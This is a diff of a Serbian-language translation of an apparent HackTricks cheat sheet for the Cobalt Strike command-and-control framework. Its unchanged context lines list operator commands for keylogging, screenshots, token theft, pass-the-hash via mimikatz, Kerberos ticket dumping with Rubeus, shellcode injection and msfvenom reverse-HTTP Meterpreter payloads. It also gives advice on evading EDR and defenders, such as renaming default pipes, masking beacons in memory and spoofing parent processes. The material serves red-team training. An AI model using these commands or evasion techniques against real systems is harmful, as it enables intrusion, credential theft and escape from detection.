@@ -1,6 +1,6 @@
 # Cobalt Strike
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
 
 ### Listeners
 
@@ -14,7 +14,7 @@ Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuni
 
 `Cobalt Strike -> Listeners -> Add/Edit` zatim treba da odaberete TCP ili SMB beacone
 
-* **TCP beacon će postaviti slušalac na odabranom portu**. Da biste se povezali na TCP beacon, koristite komandu `connect <ip> <port>` iz drugog beacona
+* **TCP beacon će postaviti slušalac na odabranom portu**. Da biste se povezali na TCP beacon, koristite komandu `connect <ip> <port>` iz drugog beacon-a
 * **smb beacon će slušati na pipename-u sa odabranim imenom**. Da biste se povezali na SMB beacon, morate koristiti komandu `link [target] [pipe]`.
 
 ### Generate & Host payloads
@@ -30,7 +30,7 @@ Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuni
 
 #### Generate & Host payloads
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršni fajl za preuzimanje beacona iz cobalt strike u formatima kao što su: bitsadmin, exe, powershell i python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršni fajl za preuzimanje beacon-a iz cobalt strike u formatima kao što su: bitsadmin, exe, powershell i python
 
 #### Host Payloads
 
@@ -45,7 +45,7 @@ execute-assembly </path/to/executable.exe>
 # Screenshots
 printscreen    # Napravite jedan screenshot putem PrintScr metode
 screenshot     # Napravite jedan screenshot
-screenwatch    # Pravite periodične screenshotove desktop-a
+screenwatch    # Pravite periodične screenshot-ove desktop-a
 ## Idite na View -> Screenshots da ih vidite
 
 # keylogger
@@ -87,20 +87,20 @@ rev2self # Prestanite da koristite token iz steal_token
 
 ## Launch process with nwe credentials
 spawnas [domain\username] [password] [listener] #Uradite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
-## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen ali sa tipom prijave 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati pozivajućeg korisnika (TargetUserName) i impersoniranog korisnika (TargetOutboundUserName).
+## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen ali sa tipom prijave 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati korisnika koji poziva (TargetUserName) i impersoniranog korisnika (TargetOutboundUserName).
 
 ## Inject into process
 inject [pid] [x64|x86] [listener]
 ## Iz OpSec tačke gledišta: Ne vršite cross-platform injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).
 
 ## Pass the hash
-## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne admin privilegije i nije baš izvodljivo ako je zaštićen proces svetlosti (PPL) omogućen.
+## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije baš izvodljivo ako je zaštićeni proces svetlosti (PPL) omogućen.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Bez /run, mimikatz pokreće cmd.exe, ako se pokrećete kao korisnik sa Desktop-om, videće shell (ako se pokrećete kao SYSTEM, možete slobodno nastaviti)
+## Bez /run, mimikatz pokreće cmd.exe, ako se pokrećete kao korisnik sa Desktop-om, videće ljusku (ako se pokrećete kao SYSTEM, dobro ste prošli)
 steal_token <pid> #Kradite token iz procesa koji je kreirao mimikatz
 
 ## Pass the ticket
@@ -109,7 +109,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Kreirajte novu sesiju prijave za korišćenje sa novim tiketom (da ne prepišete kompromitovani)
 make_token <domain>\<username> DummyPass
-## Napišite tiket na mašini napadača iz powershell sesije i učitajte ga
+## Napišite tiket na mašini napadača iz powershell sesije & učitajte ga
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -122,7 +122,7 @@ steal_token <pid>
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump interesting ticket by luid
+### Dump interesantnog tiketa po luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Kreirajte novu sesiju prijave, zabeležite luid i processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -162,7 +162,7 @@ msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## Na cobalt: Listeners > Add i postavite Payload na Foreign HTTP. Postavite Host na 10.10.5.120, Port na 8080 i kliknite Save.
+## Na cobalt: Listeners > Add i postavite Payload na Foreign HTTP. Postavite Host na 10.10.5.120, Port na 8080 i kliknite na Save.
 beacon> spawn metasploit
 ## Možete samo pokrenuti x86 Meterpreter sesije sa stranim slušateljem.
 
@@ -171,13 +171,13 @@ beacon> spawn metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Pokrenite msfvenom i pripremite multi/handler slušalac
 
-## Kopirajte bin datoteku na cobalt strike host
+## Kopirajte bin fajl na cobalt strike host
 ps
 shinject <pid> x64 C:\Payloads\msf.bin #Injektujte metasploit shellcode u x64 proces
 
 # Pass metasploit session to cobalt strike
 ## Generišite stageless Beacon shellcode, idite na Attacks > Packages > Windows Executable (S), odaberite željeni slušalac, odaberite Raw kao tip izlaza i odaberite Use x64 payload.
-## Koristite post/windows/manage/shellcode_inject u metasplotu da injektujete generisani cobalt strike shellcode
+## Koristite post/windows/manage/shellcode_inject u metaspolitu da injektujete generisani cobalt strike shellcode
 
 
 # Pivoting
@@ -198,7 +198,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 - U Cobalt Strike možete takođe koristiti BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-Agresor skript `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike koja će obojiti komande označavajući da li su BOFs (zelene), ako su Frok&Run (žute) i slično, ili ako su ProcessExecution, injekcija ili slično (crvene). Što pomaže da se zna koje su komande manje uočljive.
+Agresor skript `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike koja će obojiti komande označavajući da li su BOFs (zelene), da li su Frok&Run (žute) i slično, ili da li su ProcessExecution, injekcija ili slično (crvene). Što pomaže da se zna koje su komande manje uočljive.
 
 ### Act as the user
 
@@ -206,24 +206,24 @@ Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonE
 
 - Security EID 4624 - Proverite sve interaktivne prijave da biste znali uobičajene radne sate.
 - System EID 12,13 - Proverite učestalost gašenja/pokretanja/spavanja.
-- Security EID 4624/4625 - Proverite dolazne validne/nevalidne NTLM pokušaje.
-- Security EID 4648 - Ovaj događaj se kreira kada se koristi plaintext kredencijali za prijavu. Ako ga je generisao proces, binarni fajl potencijalno ima kredencijale u čistom tekstu u konfiguracionoj datoteci ili unutar koda.
+- Security EID 4624/4625 - Proverite dolazne validne/invalidne NTLM pokušaje.
+- Security EID 4648 - Ovaj događaj se kreira kada se koristi plaintext kredencijali za prijavu. Ako ga je proces generisao, binarni fajl potencijalno ima kredencijale u čistom tekstu u konfiguracionom fajlu ili unutar koda.
 
-Kada koristite `jump` iz cobalt strike, bolje je koristiti metodu `wmi_msbuild` da novi proces izgleda legitimnije.
+Kada koristite `jump` iz cobalt strike, bolje je koristiti `wmi_msbuild` metodu da novi proces izgleda legitimnije.
 
 ### Use computer accounts
 
-Uobičajeno je da odbrambeni timovi proveravaju čudna ponašanja generisana od strane korisnika i **isključuju servisne naloge i račune računara kao `*$` iz svog nadzora**. Možete koristiti ove račune za lateralno kretanje ili eskalaciju privilegija.
+Uobičajeno je da odbrambeni timovi proveravaju čudna ponašanja generisana od korisnika i **isključuju servisne naloge i račune računara kao `*$` iz svog nadzora**. Možete koristiti ove račune za lateralno kretanje ili eskalaciju privilegija.
 
 ### Use stageless payloads
 
-Stageless payloads su manje bučni od staged jer ne moraju da preuzmu drugu fazu sa C2 servera. To znači da ne generišu nikakav mrežni saobraćaj nakon inicijalne veze, što ih čini manje verovatnim za otkrivanje od strane mrežnih odbrana.
+Stageless payloads su manje bučni od staged jer ne moraju da preuzimaju drugu fazu sa C2 servera. To znači da ne generišu nikakav mrežni saobraćaj nakon inicijalne veze, što ih čini manje verovatnim da budu otkriveni od strane mrežnih odbrana.
 
 ### Tokens & Token Store
 
 Budite oprezni kada kradete ili generišete tokene jer može biti moguće da EDR enumeriše sve tokene svih niti i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM-u u procesu.
 
-Ovo omogućava čuvanje tokena **po beacon-u** tako da nije potrebno ponovo krasti isti token iznova i iznova. Ovo je korisno za lateralno kretanje ili kada trebate koristiti ukradeni token više puta:
+Ovo omogućava skladištenje tokena **po beacon-u** tako da nije potrebno ponovo krasti isti token iznova i iznova. Ovo je korisno za lateralno kretanje ili kada trebate koristiti ukradeni token više puta:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -246,7 +246,7 @@ U AD budite oprezni sa enkripcijom tiketa. Po defaultu, neki alati će koristiti
 
 ### Avoid Defaults
 
-Kada koristite Cobalt Strike, po defaultu SMB cevi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti imena postojećih cevi iz Cobalt Strike sa komandom: `ls \\.\pipe\`
+Kada koristite Cobalt Strike, po defaultu, SMB cevi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti imena postojećih cevi iz Cobalt Strike-a sa komandom: `ls \\.\pipe\`
 
 Pored toga, sa SSH sesijama kreira se cev pod nazivom `\\.\pipe\postex_ssh_####`. Promenite je sa `set ssh_pipename "<new_name>";`.
 
@@ -264,17 +264,17 @@ U Cobalt Strike profilima takođe možete modifikovati stvari kao što su:
 
 ### Bypass memory scanning
 
-Neki EDR-i skeniraju memoriju za neke poznate malware potpise. Cobalt Strike omogućava modifikaciju funkcije `sleep_mask` kao BOF koja će moći da enkriptuje u memoriji backdoor.
+Neki EDR-ovi skeniraju memoriju za neke poznate potpisne malware-a. Cobalt Strike omogućava modifikaciju `sleep_mask` funkcije kao BOF koja će moći da enkriptuje u memoriji backdoor.
 
 ### Noisy proc injections
 
-Kada injektujete kod u proces, ovo je obično veoma bučno, jer **ni jedan regularan proces obično ne vrši ovu akciju i zato su načini za to veoma ograničeni**. Stoga, može biti otkriveno od strane sistema za detekciju zasnovanih na ponašanju. Štaviše, može biti otkriveno i od strane EDR-a koji skeniraju mrežu za **niti koje sadrže kod koji nije na disku** (iako procesi kao što su pregledači koji koriste JIT to obično imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Kada injektujete kod u proces, ovo je obično veoma bučno, to je zato što **ni jedan regularan proces obično ne vrši ovu akciju i zato što su načini za to veoma ograničeni**. Stoga, može biti otkriveno od strane sistema za detekciju zasnovanih na ponašanju. Štaviše, može biti otkriveno i od strane EDR-ova koji skeniraju mrežu za **niti koje sadrže kod koji nije na disku** (iako procesi kao što su pregledači koristeći JIT to obično imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID and PPID relationships
 
-Kada pokrećete novi proces, važno je **održati regularan odnos roditelj-dete** između procesa kako biste izbegli otkrivanje. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.
+Kada pokrećete novi proces, važno je **održati regularan odnos roditelj-dete** između procesa kako biste izbegli detekciju. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.
 
-Kada se novi beacon pokrene u Cobalt Strike, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novog slušatelja. Ovo nije baš stealthy i može biti lako otkriveno od strane EDR-a. Pored toga, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.
+Kada se novi beacon pokrene u Cobalt Strike, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novog slušatelja. Ovo nije veoma stealthy i može biti lako otkriveno od strane EDR-ova. Pored toga, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.
 
 Sa sledećom Cobalt Strike komandom, možete odrediti drugačiji proces za pokretanje novog beacona, čineći ga manje uočljivim:
 ```bash
@@ -284,9 +284,9 @@ Možete takođe promeniti ovu postavku **`spawnto_x86` i `spawnto_x64`** u profi
 
 ### Proksiranje saobraćaja napadača
 
-Napadači ponekad će morati da budu u mogućnosti da pokreću alate lokalno, čak i na linux mašinama i da omoguće da saobraćaj žrtava dođe do alata (npr. NTLM relay).
+Napadači ponekad će morati da budu u mogućnosti da pokreću alate lokalno, čak i na linux mašinama i da omoguće saobraćaju žrtava da dođe do alata (npr. NTLM relay).
 
-Štaviše, ponekad je za napadača stealthier da **doda ovaj hash ili tiket u svoj vlastiti LSASS proces** lokalno i zatim se prebacuje iz njega umesto da menja LSASS proces žrtvinske mašine.
+Štaviše, ponekad je za napadača stealthier da **doda ovaj hash ili tiket u svoj vlastiti LSASS proces** lokalno i zatim se prebacuje sa njega umesto da modifikuje LSASS proces žrtvinske mašine.
 
 Međutim, morate biti **oprezni sa generisanim saobraćajem**, jer možda šaljete neobičan saobraćaj (kerberos?) iz vašeg backdoor procesa. Za ovo biste mogli da se prebacite na proces pregledača (iako biste mogli biti uhvaćeni ako se injektujete u proces, pa razmislite o stealth načinu da to uradite).
 ```bash
@@ -364,4 +364,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
